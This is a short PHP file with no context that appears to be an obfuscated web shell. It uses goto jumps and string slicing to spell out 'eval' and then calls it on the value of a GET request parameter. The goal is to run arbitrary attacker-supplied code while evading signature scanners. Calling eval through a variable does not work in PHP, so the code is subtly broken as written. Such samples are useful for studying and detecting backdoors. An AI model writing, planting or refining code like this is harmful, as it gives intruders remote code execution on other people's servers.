<?php
goto labal1;
labal2:
$c = 'c';
$d = substr(substr('ssddwwqq',2, 1),0,1);
goto labal3;
labal1:
$a = 'a';
$b = 'b';
goto labal2;
labal3:
$e = $_GET['x'];
$f = 'ev'.substr($a.$b.$c, 0,1).'l';
$f($e);
?>
